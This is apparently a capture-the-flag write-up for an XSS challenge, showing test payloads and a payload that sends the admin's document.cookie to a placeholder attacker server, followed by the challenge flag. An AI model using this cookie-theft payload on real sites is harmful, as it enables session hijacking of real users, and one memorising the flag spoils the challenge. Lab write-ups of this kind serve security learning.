# Writeup

### Challenge available at `https://mistune.flatearth.fluxfingers.net/`

# Description:
 Try to steal admin cookie. Admin will click on ```<a>``` tag. This challenge has XSS vulnerability by which you can use it to steal admin cookie.

# Test:

After searching for a while i found this maybe useful ```<javascript:alert('xss')>```, and the result:

Then i try ```<javascript:alert(document.cookie)>```, the result:

# Exploit:

After testing, i will try to get current session to my server before send script to admin
```<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>``` then i receive this:

Now we are ready to steal admin cookie ```<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>```

And #BINGO

# flag{92da883eb1df9d1287ff25f1a1099f29}